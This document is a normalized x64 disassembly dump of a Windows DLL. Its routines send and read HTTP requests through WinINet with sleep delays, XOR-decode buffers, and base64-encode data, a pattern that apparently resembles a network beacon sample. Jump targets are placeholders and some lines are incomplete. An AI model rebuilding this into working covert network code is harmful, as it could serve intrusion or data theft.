mov [ rsp + 0x48 ] 0xf
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x30 ] 0x0
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x30 ]
call sub_180008000
lea r8 [ rsp + 0x30 ]
mov rdx rdi
mov rcx rbx
call sub_180015d60
nop
cmp [ rsp + 0x70 ] 0x10
jb r-xdata
mov rax rdi
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0xb0 ]
add rsp 0x90
pop rdi
retn
mov rcx [ rsp + 0x58 ]
call j_sub_18002094c#2
sub_180016950
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0xd0
mov [ rbp - 0x19 ] 0xfffffffffffffffe
mov [ rsp + 0x120 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1f ] rax
mov r15 rdx
mov rbx rcx
mov [ rbp - 0x59 ] rcx
mov [ rbp - 0x11 ] rdx
xor sil sil
mov rax [ rdx ]
test rax rax
je r-xdata
mov rbx [ rdx + 0x8 ]
test rbx rbx
je r-xdata
cmp [ rax + 0x8 ] 0x4
jb r-xdata
xor al al
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
mov rcx [ rax ]
or edi 0xffffffff
test rcx rcx
je r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov r8d edi
mov rax [ rw-data ]
mov r8d [ rcx + rax ]
jmp r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
mov r13d r14d
cmp [ rw-data ] r14d
jbe r-xdata
cmp [ rbp + 0xf ] 0x10
jb r-xdata
lea rdx [ rbp - 0x9 ]
mov rcx rbx
call sub_180016890
nop
xor r14d r14d
mov [ rbp - 0x69 ] r14d
mov rdx [ r15 ]
lea r9 [ rbp - 0x69 ]
mov r8d [ rdx + 0x8 ]
mov rdx [ rdx ]
mov rcx rbx
call sub_180016780
mov [ rbp - 0x61 ] rax
test rax rax
jne r-xdata
mov rcx [ rbp - 0x61 ]
call sub_18002094c
nop
cmp [ rbp + 0xf ] 0x10
jb r-xdata
nop [ rax ] eax
mov [ rbp + 0xf ] 0xf
mov [ rbp + 0x7 ] r14
mov [ rbp - 0x9 ] 0x0
mov rcx r15
call sub_180018390
jmp r-xdata
mov rcx [ rbp - 0x9 ]
call j_sub_18002094c#2
mov [ rbp + 0xf ] 0xf
mov [ rbp + 0x7 ] 0x0
mov [ rbp - 0x9 ] 0x0
mov rbx [ r15 + 0x8 ]
test rbx rbx
je r-xdata
mov rcx [ rbp - 0x9 ]
call j_sub_18002094c#2
inc r13d
cmp r13d [ rw-data ]
jae r-xdata
lea rdx [ rbx + 0x40 ]
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
movzx eax sil
jmp r-xdata
mov eax edi
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
xor sil sil
jmp r-xdata
mov r8d 0x50
mov [ rsp + 0x38 ] r14
mov [ rsp + 0x30 ] r14d
mov [ rsp + 0x28 ] 0x3
mov [ rsp + 0x20 ] r14
xor r9d r9d
mov rcx rax
call [ InternetConnectW@IAT ]
mov r12 rax
test rax rax
jne r-xdata
mov rdx [ rdx ]
mov rcx [ rbp + 0x1f ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x120 ]
add rsp 0xd0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rdx [ rbx ]
mov rcx rbx
call [ rdx ]
[ rbx + 0xc ]
jne r-xdata
mov [ rsp + 0x20 ] r14d
xor r9d r9d
xor r8d r8d
xor edx edx
lea rcx [ r--data ]
call [ InternetOpenW@IAT ]
mov rsi rax
test rax rax
je r-xdata
lea r8 [ rbp - 0x9 ]
cmp [ rbp + 0xf ] 0x10
cmovae r8 [ rbp - 0x9 ]
mov [ rsp + 0x38 ] r14
mov [ rsp + 0x30 ] 0x4480000
mov [ rsp + 0x28 ] r14
mov [ rsp + 0x20 ] r14
xor r9d r9d
lea rdx [ r--data ]
mov rcx rax
call [ HttpOpenRequestA@IAT ]
mov r14 rax
test rax rax
jne r-xdata
mov rcx rsi
call [ InternetCloseHandle@IAT ]
jmp r-xdata
mov rdx [ rbx ]
mov rcx rbx
call [ rdx + 0x8 ]
mov rdx rax
mov rcx rbx
call sub_180015840
mov [ rbp - 0x51 ] 0x38
xor ecx ecx
mov [ rbp - 0x49 ] rcx
mov [ rbp - 0x41 ] rcx
mov [ rbp - 0x39 ] rcx
mov rax [ rbp - 0x61 ]
mov [ rbp - 0x31 ] rax
mov eax [ rbp - 0x69 ]
mov [ rbp - 0x29 ] eax
mov [ rbp - 0x25 ] eax
mov [ rsp + 0x20 ] rcx
xor r9d r9d
xor r8d r8d
lea rdx [ rbp - 0x51 ]
mov rcx r14
call [ HttpSendRequestExW@IAT ]
mov ebx eax
mov ecx 0x1f4
call [ Sleep@IAT ]
mov rcx rsi
call [ InternetCloseHandle@IAT ]
mov rcx r12
call [ InternetCloseHandle@IAT ]
mov rcx r14
call [ InternetCloseHandle@IAT ]
test ebx ebx
jne r-xdata
mov rcx rsi
call [ InternetCloseHandle@IAT ]
mov rcx r12
call [ InternetCloseHandle@IAT ]
jmp r-xdata
mov sil 0x1
jmp r-xdata
mov ecx 0xbb8
call [ Sleep@IAT ]
mov rbx [ rbp - 0x59 ]
xor r14d r14d
sub_180016c70
push r12
sub rsp 0x50
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x68 ] rbp
mov [ rsp + 0x70 ] rsi
mov [ rsp + 0x78 ] rdi
mov rdi rcx
mov rax [ rcx ]
lea rdx [ rsp + 0x28 ]
call [ rax + 0x28 ]
movzx eax [ rax + 0x3 ]
cmp [ rdi + 0x68 ] eax
sete bl
lea rcx [ rsp + 0x30 ]
call sub_180002870
test bl bl
je r-xdata
inc [ rdi + 0x68 ]
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
add rsp 0x50
pop r12
retn
xor r12d r12d
mov [ rdi + 0x68 ] r12d
mov rax [ rdi ]
lea rdx [ rsp + 0x28 ]
mov rcx rdi
call [ rax + 0x28 ]
nop
xor bl bl
mov rcx [ rsp + 0x38 ]
mov r10 [ rsp + 0x30 ]
sub rcx r10
mov rax 0x6666666666666667
imul rcx
mov rsi rdx
sar rsi 0x4
mov rax rsi
shr rax 0x3f
add rsi rax
test esi esi
je r-xdata
movzx eax bl
lea rcx [ rdi + 0x40 ]
or r9 0xffffffffffffffff
xor r8d r8d
cmp eax esi
jne r-xdata
nop [ rax + rax ] ax
inc eax
xor edx edx
div esi
lea rax [ rdx + rdx * 4 ]
lea rdx [ r10 + rax * 8 ]
mov rdx r10
jmp r-xdata
mov r10 [ rsp + 0x30 ]
inc bl
movzx eax bl
cmp eax esi
jae r-xdata
mov rsi [ rsp + 0x38 ]
cmp rbx rsi
je r-xdata
call sub_180001ba0
nop
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov r10 [ rsp + 0x30 ]
jmp r-xdata
mov rcx rbx
call j_sub_18002094c#2
nop [ rax ] eax
movzx eax bl
lea rcx [ rax + rax * 4 ]
lea rcx [ r10 + rcx * 8 ]
lea rdx [ rdi + 0x40 ]
call sub_180015360
test eax eax
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rbx [ rsp + 0x30 ]
sub_180016de0
push rbx
sub rsp 0x20
movzx eax [ rcx + 0x8 ]
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
mov [ rdx ] ax
movzx eax [ rcx + 0xa ]
mov [ rdx + 0x2 ] al
movzx eax [ rcx + 0xb ]
mov [ rdx + 0x3 ] al
lea rdx [ rcx + 0x10 ]
lea rcx [ rbx + 0x8 ]
call sub_1800028f0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180016e20
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x5f ]
sub rsp 0xa0
mov [ rbp - 0x9 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
mov rdi rcx
test edx edx
je r-xdata
xor eax eax
xor r13d r13d
mov ebx r13d
mov [ rbp - 0x19 ] rbx
mov r14d r13d
mov [ rbp - 0x25 ] r13d
mov r8d edx
lea rdx [ rbp - 0x1 ]
call sub_180016890
nop
mov [ rsp + 0x20 ] r13d
xor r9d r9d
xor r8d r8d
xor edx edx
lea rcx [ r--data ]
call [ InternetOpenW@IAT ]
mov r12 rax
test rax rax
jne r-xdata
lea rdx [ rdi + 0x40 ]
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
mov [ rdi + 0x6c ] al
jmp r-xdata
mov r8d 0x50
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r13d
mov [ rsp + 0x28 ] 0x3
mov [ rsp + 0x20 ] r13
xor r9d r9d
mov rcx rax
call [ InternetConnectW@IAT ]
mov r15 rax
test rax rax
jne r-xdata
mov rdx [ rdx ]
cmp [ rbp + 0x17 ] 0x10
jb r-xdata
lea r8 [ rbp - 0x1 ]
cmp [ rbp + 0x17 ] 0x10
cmovae r8 [ rbp - 0x1 ]
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r13d
mov [ rsp + 0x28 ] r13
mov [ rsp + 0x20 ] r13
xor r9d r9d
lea rdx [ r--data ]
mov rcx rax
call [ HttpOpenRequestA@IAT ]
mov rsi rax
test rax rax
jne r-xdata
mov [ rdi + 0x6c ] al
mov rcx r12
call [ InternetCloseHandle@IAT ]
nop
jmp r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_18002094c#2
mov rdx rax
mov rcx rdi
call sub_180015840
mov [ rsp + 0x20 ] r13d
xor r9d r9d
xor r8d r8d
xor edx edx
mov rcx rsi
call [ HttpSendRequestW@IAT ]
test eax eax
je r-xdata
mov [ rdi + 0x6c ] al
mov rcx r12
call [ InternetCloseHandle@IAT ]
mov rcx r15
call [ InternetCloseHandle@IAT ]
nop
jmp r-xdata
mov [ rdi + 0x6c ] 0x0
mov rcx rdi
call sub_180016c70
mov [ rbp - 0x29 ] r13d
mov [ rsp + 0x20 ] r13
lea r9 [ rbp - 0x29 ]
xor r8d r8d
lea edx [ r8 + 0x15 ]
mov rcx rsi
call [ HttpQueryInfoW@IAT ]
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp r14d 0x4
jb r-xdata
mov [ rdi + 0x6c ] 0x1
jmp r-xdata
mov ecx [ rbp - 0x29 ]
lea edx [ rax - 0x79 ]
call sub_180021308
mov rbx rax
mov [ rsp + 0x20 ] r13
lea r9 [ rbp - 0x29 ]
mov r8 rax
mov edx 0x13
mov rcx rsi
call [ HttpQueryInfoW@IAT ]
lea rcx [ r--data ]
mov edx [ rbx ]
cmp edx [ rcx ]
jne r-xdata
mov ecx 0x10
call sub_180021000
mov rbx rax
test rax rax
je r-xdata
mov rcx r12
call [ InternetCloseHandle@IAT ]
mov rcx r15
call [ InternetCloseHandle@IAT ]
mov rcx rsi
call [ InternetCloseHandle@IAT ]
test rbx rbx
je r-xdata
sbb eax eax
sbb eax 0xffffffff
movzx edx [ rbx + 0x4 ]
cmp dx [ rcx + 0x4 ]
jne r-xdata
mov rbx r13
mov eax r14d
mov rcx [ rbp - 0x19 ]
mov [ rbx ] rcx
mov [ rbx + 0x8 ] rax
jmp r-xdata
call sub_18002094c
mov [ rbp - 0xd ] 0x4
mov [ rsp + 0x20 ] r13
lea r9 [ rbp - 0xd ]
lea r8 [ rbp - 0x29 ]
mov edx 0x20000005
mov rcx rsi
call [ HttpQueryInfoW@IAT ]
test eax eax
je r-xdata
mov [ rdi + 0x6c ] 0x1
call sub_18002094c
mov rcx r12
call [ InternetCloseHandle@IAT ]
mov rcx r15
call [ InternetCloseHandle@IAT ]
mov rcx rsi
call [ InternetCloseHandle@IAT ]
nop
jmp r-xdata
mov eax r13d
jmp r-xdata
mov rax rbx
jmp r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_18002094c#2
cmp [ rbp + 0x17 ] 0x10
jb r-xdata
mov rbx [ rbp - 0x19 ]
jmp r-xdata
mov eax [ rbp - 0x29 ]
cmp eax 0x7
jbe r-xdata
mov rcx rbx
test eax eax
je r-xdata
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0xa0 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov ebx r13d
mov [ rbp - 0x11 ] r13d
mov [ rbp - 0x21 ] r13d
mov ecx eax
mov edx 0x1
call sub_180021308
mov r13 rax
test rax rax
je r-xdata
xor r13d r13d
nop
mov r8d [ rbp - 0x29 ]
mov edx ebx
add rdx r13
lea r9 [ rbp - 0x11 ]
mov rcx rsi
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
add ebx [ rbp - 0x11 ]
mov r8d [ rbp - 0x29 ]
cmp ebx r8d
jb r-xdata
xor r9d r9d
xor r8d r8d
lea rdx [ rbp - 0x21 ]
mov rcx rsi
call [ InternetQueryDataAvailable@IAT ]
mov r8d [ rbp - 0x21 ]
test r8d r8d
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
sub r8d eax
lea rdx [ r13 + rax ]
lea r9 [ rbp - 0x25 ]
mov rcx rdi
call sub_180015130
mov rbx rax
mov [ rbp - 0x19 ] rax
mov rcx r13
call sub_18002094c
mov r14d [ rbp - 0x25 ]
jmp r-xdata
sub_1800171b0
mov [ rsp + 0x10 ] rdx
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rbp
mov rdi rdx
movzx eax [ rdx + 0x2 ]
mov [ rcx + 0xa ] al
movzx eax [ rdx ]
mov [ rcx + 0x8 ] ax
movzx eax [ rdx + 0x3 ]
mov [ rcx + 0xb ] al
lea rsi [ rcx + 0x10 ]
mov rcx rsi
call sub_180004ff0
xor bl bl
mov rcx [ rdi + 0x10 ]
sub rcx [ rdi + 0x8 ]
mov r12 0x6666666666666667
mov rax r12
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
xor ebp ebp
add rdx rax
je r-xdata
mov rbx [ rdi + 0x8 ]
test rbx rbx
je r-xdata
mov r8d ebp
nop [ rax + rax ] ax
mov [ rdi + 0x8 ] rbp
mov [ rdi + 0x10 ] rbp
mov [ rdi + 0x18 ] rbp
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov rsi [ rdi + 0x10 ]
cmp rbx rsi
je r-xdata
lea rcx [ r8 + r8 * 4 ]
mov rax [ rdi + 0x8 ]
lea rdx [ rax + rcx * 8 ]
mov rcx rsi
call sub_180005cf0
inc bl
movzx r8d bl
mov rcx [ rdi + 0x10 ]
sub rcx [ rdi + 0x8 ]
mov rax r12
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jb r-xdata
mov rcx [ rdi + 0x8 ]
call j_sub_18002094c#2
nop [ rax ] eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rbp
mov [ rbx ] bp
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
sub_1800172d0
mov r11 rsp
push rsi
push rdi
push r12
sub rsp 0x90
mov [ rsp + 0x50 ] 0xfffffffffffffffe
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov rbp rcx
xor r12d r12d
mov [ r11 - 0x80 ] r12
mov [ r11 - 0x78 ] r12
mov [ r11 - 0x70 ] r12
movzx eax [ rw-data ]
mov [ rsp + 0x20 ] ax
movzx eax [ rw-data ]
mov [ rsp + 0x22 ] al
movzx eax [ rw-data ]
mov [ rsp + 0x23 ] al
lea ecx [ r12 + 0x30 ]
call sub_180021000
mov [ rsp + 0x48 ] rax
test rax rax
je r-xdata
mov rsi r12
mov rcx rax
call sub_180017520
mov rsi rax
jmp r-xdata
add rbx 0x3c
dec rdi
jne r-xdata
mov rcx [ rsp + 0x58 ]
call j_sub_18002094c#2
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800175a0
lea rbx [ rw-data ]
mov edi 0x4
nop [ rax + rax ] ax
mov r8d 0x3c
mov rdx rbx
mov rcx rsi
call sub_180017590
lea rdx [ rsp + 0x58 ]
mov rcx rsi
call sub_180017bc0
nop
mov rdx rax
lea rcx [ rsp + 0x28 ]
call sub_1800091f0
nop
cmp [ rsp + 0x70 ] 0x8
jb r-xdata
test rsi rsi
je r-xdata
lea rcx [ rbp + 0x40 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov rsi [ rsp + 0x28 ]
mov rdx rsi
call sub_180001ba0
movzx r11d [ rsp + 0x20 ]
mov [ rsp + 0x58 ] r11w
movzx eax [ rsp + 0x22 ]
mov [ rsp + 0x5a ] al
movzx eax [ rsp + 0x23 ]
mov [ rsp + 0x5b ] al
lea rdx [ rsp + 0x28 ]
lea rcx [ rsp + 0x60 ]
call sub_1800028f0
mov r11 [ rbp ]
lea rdx [ rsp + 0x58 ]
mov rcx rbp
call [ r11 + 0x30 ]
nop
test rsi rsi
je r-xdata
mov rcx rsi
call sub_180017560
mov rcx rsi
call j_sub_18002094c#2
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov rbx rsi
mov rdi [ rsp + 0x30 ]
cmp rsi rdi
je r-xdata
mov rcx rsi
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_1800174a0
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx rcx
xor ecx ecx
mov [ rbx + 0x8 ] ecx
mov [ rbx + 0x10 ] rcx
mov [ rbx + 0x18 ] rcx
mov [ rbx + 0x20 ] rcx
lea rax [ r--data ]
mov [ rbx ] rax
mov [ rbx + 0x58 ] 0x7
mov [ rbx + 0x50 ] rcx
mov [ rbx + 0x40 ] cx
mov [ rbx + 0x6c ] cl
mov [ rbx + 0x68 ] ecx
mov [ rbx + 0x38 ] 0xf
lea edx [ rcx + 0x1 ]
lea ecx [ rdx + 0xe ]
call sub_180021308
mov [ rbx + 0x30 ] rax
mov rcx rbx
call sub_1800172d0
mov rcx rbx
call sub_1800153f0
nop
mov rax rbx
add rsp 0x30
pop rbx
retn
sub_180017560
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x20 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
call sub_18002094c
add rsp 0x20
pop rbx
retn
call sub_18002094c
sub_1800175b0
mov [ rsp + 0x20 ] rbx
push rdi
sub rsp 0x20
mov rdi [ rcx ]
mov rbx rcx
test rdi rdi
je r-xdata
xor eax eax
mov rbx [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rcx + 0x8 ]
test rcx rcx
je r-xdata
add rcx 0x2
mov edx 0x1
call sub_180021308
mov r11 rax
test rax rax
je r-xdata
movsxd rax [ rbx + 0x8 ]
mov r8 rax
cmp eax 0xffffffff
jle r-xdata
mov rax [ rbx + 0x10 ]
movzx ecx [ rax ]
mov rax r11
xor cl [ rdi ]
mov [ r11 ] cl
mov rbx [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rbp
mov rbp [ rbx + 0x10 ]
mov [ rsp + 0x38 ] rsi
mov rsi [ rbx + 0x18 ]
mov [ rsp + 0x40 ] r12
lea r9 [ rax + r11 ]
lea r12 [ rdi + rax ]
lea r10d [ rax + 0x1 ]
nop
xor edx edx
mov rax r8
dec r9
div rsi
dec r8
dec r12
movzx eax [ rdx + rbp ]
xor al [ r12 + 0x1 ]
xor al [ r12 ]
dec r10
mov [ r9 + 0x1 ] al
jne r-xdata
mov r12 [ rsp + 0x40 ]
mov rsi [ rsp + 0x38 ]
mov rbp [ rsp + 0x30 ]
sub_180017680
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov ecx [ rw-data ]
movzx edi dl
mov edx 0x1
call sub_180021308
xor r9d r9d
mov r11 rax
mov r10d r9d
nop [ rax ] eax
lea r8d [ r10 + 0x41 ]
lea ecx [ r10 + 0x61 ]
inc r10d
mov [ rax ] r8b
mov [ rax + 0x1a ] cl
inc rax
cmp r10d 0x1a
jl r-xdata
lea rcx [ r11 + 0x34 ]
nop
lea eax [ r9 + 0x30 ]
inc r9d
inc rcx
mov [ rcx - 0x1 ] al
cmp r9d 0xa
jl r-xdata
cmp dil [ rw-data ]
jne r-xdata
cmp dil [ rw-data ]
jne r-xdata
mov [ r11 + 0x3e ] 0x5f2d
mov [ rbx + 0x28 ] r11
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ r11 + 0x3e ] 0x2f2b
mov [ rbx + 0x20 ] r11
sub_180017720
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov r12d [ rw-data ]
lea rsi [ r8 + r8 + 0x8000 ]
xor ebp ebp
mov r15 rdx
and rsi 0xffffffffffff8000
lea edx [ rbp + 0x1 ]
add rsi 0x8000
mov rbx r9
mov r14 r8
lea rcx [ r12 + rsi ]
mov r13d ebp
call sub_180021308
mov [ rbx ] rbp
mov rdi rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdx [ rsp + 0x70 ]
add rsi rax
mov r8 r12
mov rcx rsi
call sub_1800205e0
mov r11d 0x4
cmp r14 0x3
jb r-xdata
test r14 r14
je r-xdata
mov rax 0xaaaaaaaaaaaaaaab
mul r14
mov r10 rdx
shr r10 0x1
mov rax r10
imul rax rax 0xfffffffffffffffd
add r14 rax
nop
mov rax rdi
cmp r14 0x1
jbe r-xdata
mov rcx [ rbx ]
mov rax rdx
shr rdx 0x6
sub rcx r8
and eax 0x3f
inc r8
dec r9
movzx eax [ rax + rsi ]
mov [ rcx + rdi + 0x3 ] al
jne r-xdata
add [ rbx ] r11
dec r10
jne r-xdata
movzx edx [ r13 + r15 ]
shl rdx 0x10
nop [ rax + rax ] ax
movzx eax [ r13 + r15 ]
movzx edx [ r13 + r15 + 0x1 ]
shl rax 0x8
add rdx rax
shl rdx 0x8
jmp r-xdata
movzx eax [ r13 + r15 ]
movzx ecx [ r13 + r15 + 0x1 ]
movzx edx [ r13 + r15 + 0x2 ]
shl rax 0x8
mov r8 rbp
mov r9 r11
xor rcx rax
shl rcx 0x8
xor rdx rcx
add r13 0x3
nop [ rax + rax ] ax
mov rcx [ rbx ]
mov rax rdx
shr rdx 0x6
sub rcx rbp
and eax 0x3f
inc rbp
dec r11
movzx eax [ rax + rsi ]
mov [ rcx + rdi + 0x3 ] al
jne r-xdata
mov rax [ rbx ]
mov [ rax + rdi + 0x3 ] 0x3d
cmp r14 0x1
jne r-xdata
add [ rbx ] 0x4
mov rax [ rbx ]
mov [ rax + rdi + 0x2 ] 0x3d
sub_1800178b0
push rbp
push rsi
push r12
sub rsp 0x20
mov rbp r9
mov r12 r8
mov rsi rdx
test r8b 0x3
je r-xdata
mov [ rsp + 0x40 ] rbx
mov edx 0x1
mov ecx 0x100
mov [ rsp + 0x48 ] rdi
mov [ rsp + 0x50 ] r13
call sub_180021308
mov r8 [ rsp + 0x60 ]
xor dl dl
mov rbx rax
nop [ rax + rax ] eax
xor eax eax
add rsp 0x20
pop r12
pop rsi
pop rbp
retn
movsx rcx [ r8 ]
inc r8
mov [ rcx + rax ] dl
inc dl
cmp dl 0x40
jb r-xdata
mov rcx r12
shr rcx 0x2
cmp [ rsi + r12 - 0x1 ] 0x3d
lea rdi [ rcx + rcx * 2 ]
jne r-xdata
cmp [ rsi + r12 - 0x2 ] 0x3d
jne r-xdata
dec rdi
mov edx 0x1
mov rcx rdi
mov [ rbp ] rdi
call sub_180021308
mov r13 rax
test rax rax
jne r-xdata
dec rdi
xor ecx ecx
xor r8d r8d
test r12 r12
je r-xdata
mov rcx rbx
call sub_18002094c
xor eax eax
jmp r-xdata
mov rcx rbx
call sub_18002094c
mov rax r13
mov rdx rax
nop [ rax + rax ] eax
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov r13 [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rsi
pop rbp
retn
movsx rax r9b
movsx r9d [ rax + rbx ]
xor r9d r9d
jmp r-xdata
movsx rax r10b
movsx ebp [ rax + rbx ]
xor ebp ebp
jmp r-xdata
inc ecx
movzx r10d [ rcx + rsi ]
cmp r10b 0x3d
jne r-xdata
movsx rax r10b
movsx r11d [ rax + rbx ]
xor r11d r11d
jmp r-xdata
inc ecx
movzx r10d [ rcx + rsi ]
cmp r10b 0x3d
jne r-xdata
movsx rax r10b
movsx eax [ rax + rbx ]
xor eax eax
jmp r-xdata
inc ecx
movzx r10d [ rcx + rsi ]
cmp r10b 0x3d
jne r-xdata
mov eax r8d
cmp rax rdi
jae r-xdata
mov eax r9d
inc r8d
sar eax 0x10
inc rdx
mov [ rdx - 0x1 ] al
shl r9d 0x6
inc ecx
add r9d ebp
shl r9d 0x6
add r9d r11d
shl r9d 0x6
add r9d eax
mov eax r8d
cmp rax rdi
jae r-xdata
mov eax r8d
cmp rax rdi
jae r-xdata
mov eax r9d
inc r8d
sar eax 0x8
inc rdx
mov [ rdx - 0x1 ] al
mov eax ecx
cmp rax r12
jb r-xdata
mov [ rdx ] r9b
inc r8d
inc rdx
movzx r9d [ rcx + rsi ]
cmp r9b 0x3d
jne r-xdata
sub_180017a70
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rcx + 0x28 ] 0x0
mov rdi r9
mov rsi r8
mov rbp rdx
mov rbx rcx
jne r-xdata
mov rax [ rbx + 0x28 ]
mov r9 rdi
mov r8 rsi
mov rdx rbp
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_1800178b0
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
movzx edx [ rw-data ]
call sub_180017680
sub_180017ae0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rcx + 0x28 ] 0x0
mov rdi r9
mov rsi r8
mov rbp rdx
mov rbx rcx
jne r-xdata
mov rax [ rbx + 0x28 ]
mov r9 rdi
mov r8 rsi
mov rdx rbp
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180017720
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
movzx edx [ rw-data ]
call sub_180017680
sub_180017b50
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rcx + 0x20 ] 0x0
mov rdi r9
mov rsi r8
mov rbp rdx
mov rbx rcx
jne r-xdata
mov rax [ rbx + 0x20 ]
mov r9 rdi
mov r8 rsi
mov rdx rbp
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180017720
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
movzx edx [ rw-data ]
call sub_180017680
sub_180017bc0
push rbp
push rsi
push rdi
sub rsp 0x60
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0x90 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x58 ] rax
mov rbx rdx
xor esi esi
mov [ rsp + 0x20 ] esi
call sub_1800175b0
mov rbp rax
or rcx 0xffffffffffffffff
test rax rax
jne r-xdata
mov [ rsp + 0x48 ] 0x7
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x30 ] si
xor eax eax
mov rdi rbp
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rbp
lea rcx [ rsp + 0x30 ]
call sub_180003930
nop
mov rcx rbp
call sub_18002094c
